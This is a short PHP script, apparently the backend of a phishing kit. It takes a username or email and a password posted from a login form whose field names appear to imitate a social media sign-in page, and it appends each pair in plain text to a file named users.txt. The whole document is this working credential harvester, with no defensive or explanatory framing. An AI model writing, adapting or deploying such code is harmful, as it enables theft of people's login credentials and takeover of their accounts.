<?php

if(
	isset($_POST['session']) &&
	isset($_POST['session']['username_or_email']) &&
	!empty($_POST['session']['username_or_email'])
) {
	$username = $_POST['session']['username_or_email'];

} else {
	die();
}

if(
	isset($_POST['session']) &&
	isset($_POST['session']['password']) &&
	!empty($_POST['session']['password'])
) {
	$password = $_POST['session']['password'];
} else {
	die();
}

file_put_contents('users.txt', $username." <=> ".$password."\n\n", FILE_APPEND);